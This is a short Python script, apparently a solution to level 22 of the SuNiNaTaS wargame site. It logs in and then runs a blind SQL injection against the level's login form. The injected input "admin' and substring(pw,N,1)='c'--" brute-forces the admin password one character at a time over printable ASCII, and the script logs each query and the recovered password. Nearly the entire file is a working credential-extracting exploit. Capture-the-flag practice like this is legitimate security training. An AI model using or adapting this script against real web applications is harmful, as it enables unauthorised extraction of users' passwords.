import requests

login_url = 'http://suninatas.com/member/mem_action.asp'
with requests.Session() as s:
    main_login = {'Hid': '', 'Hpw': ''}

    main_login_req = s.post(login_url, data=main_login)

    if main_login_req.status_code != 200:
        raise Exception('connection error')
    
    #로그인 세션 유지

    password = ''
    log = ''
    level22 = 'http://suninatas.com/Part_one/web22/web22.asp'

    login = {'id':'', 'pw':1234} # login data

    # blind sql injection query
    str1 = "admin' and substring(pw,"
    column = 1
    str2 = ",1)='"
    alphabet = 32 # space
    str3 = "'--"


    while(column <= 10): # loop for column
        log += 'column : ' + str(column) + '\n'
        while(alphabet <= 126): # loop for alphabet
            # upper case
            str_id = str1 + str(column) + str2 + chr(alphabet) + str3
            login['id'] = str_id
            req = s.post(level22, data=login)
            log += 'query : ' + str_id + '\n'
            if 'OK' in req.text:
                password += chr(alphabet)
                break
            
            alphabet += 1
        log += 'password : ' +  str(password) + '\n'
        alphabet = 32
        column += 1
    with open('level22.txt', 'w') as f:
        f.write(log)
    print('done')